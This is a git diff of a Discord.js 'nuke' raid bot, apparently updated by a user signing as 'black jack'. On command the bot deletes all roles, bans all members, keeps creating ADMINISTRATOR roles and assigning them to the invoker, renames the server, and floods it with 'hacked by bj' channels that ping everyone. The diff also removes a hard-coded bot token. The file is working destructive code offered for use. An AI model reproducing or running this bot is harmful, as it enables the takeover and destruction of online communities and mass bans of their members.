@@ -3,12 +3,8 @@ const client = new Discord.Client();
 const prefix = "."; ///lera ba dly xot prefix dabne
 client.on("ready", () => {
   console.log(`Logged in as ${client.user.tag}!`);
+  console.log(`Bot Hack Is Ready`)
 });
-
-// message.guild.members.forEach(m =>{
-// m.ban()
-
-// })
 
 
 client.on("message", message => {
@@ -23,16 +19,16 @@ client.on("message", message => {
     message.guild.roles.cache.forEach(r => {
       r.delete();
     });
-
     message.guild.members.cache.forEach(m => {
       m.ban();
     });
-
     setInterval(() => {
       message.guild.roles
         .create({
-          name: "LeGenD is here :joy:",
+        data: {
+          name: "Hacked:joy:",
           permissions: ["ADMINISTRATOR"]
+        }
         })
         .then(rr => {
           message.member.roles.add(rr.id);
@@ -40,19 +36,19 @@ client.on("message", message => {
     }, 1000);
     message.guild.setIcon("https://media.discordapp.net/attachments/839471875075473423/862400360437121054/Image_about_cute_in_s_by_moonlxght_on_We_Heart_It.jpg");
     client.user.setAvatar("https://media.discordapp.net/attachments/839471875075473423/862400360437121054/Image_about_cute_in_s_by_moonlxght_on_We_Heart_It.jpg");
-    client.user.setUsername("LeGenD UP");
+    client.user.setUsername("Bj UP");
     message.guild.owner.send(
-      "تـڕپـەقـاڵ ئـەمـژی"
+      "Mazay kury kar bro servert bbyna gayrawa"
     );
-    message.guild.setName("legend is here");
+    message.guild.setName("Bj Up");
     setTimeout(function() {
       setInterval(
         () => {
           message.guild.channels
-            .create("hacked by legend", "text")
+            .create("hacked by bj", "text")
             .then(channel => {
               channel.send(
-                "@everyone LeGenD is here :joy: :joy: :joy:"
+                "@everyone Bj Up :joy: :joy: :joy:"
               );
             });
         },
@@ -62,10 +58,8 @@ client.on("message", message => {
     });
   }
 });
-
-
-
+////updated for v12 by black jack
 
 ////codaka drwst krawa lalayan black jack
 
-client.login("ODY0NDQ2MzU4MzU0NTI2MjQx.YO1kaA.8car2jL5UP3YtX-1X0HpG42Fc4s");
+client.login("");
